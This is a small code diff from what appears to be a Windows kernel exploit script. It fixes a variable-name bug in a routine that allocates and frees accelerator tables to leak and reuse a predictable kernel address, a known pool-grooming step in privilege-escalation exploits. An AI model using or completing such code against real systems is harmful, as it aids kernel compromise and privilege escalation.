@@ -1381,7 +1381,7 @@ def alloc_free_accelerator_tables():
 		hAccel = user32.CreateAcceleratorTableA(addressof(accel_array), 675) # size = 0x1000
 		kernel_address = get_accel_kernel_address(hAccel)
 		user32.DestroyAcceleratorTable(hAccel)
-		if previous_entry == kernel_address:
+		if previous_kernel_address == kernel_address:
 			print "[+] Duplicate AcceleratorTable: 0x%X" % kernel_address
 			return kernel_address
 		previous_kernel_address = kernel_address
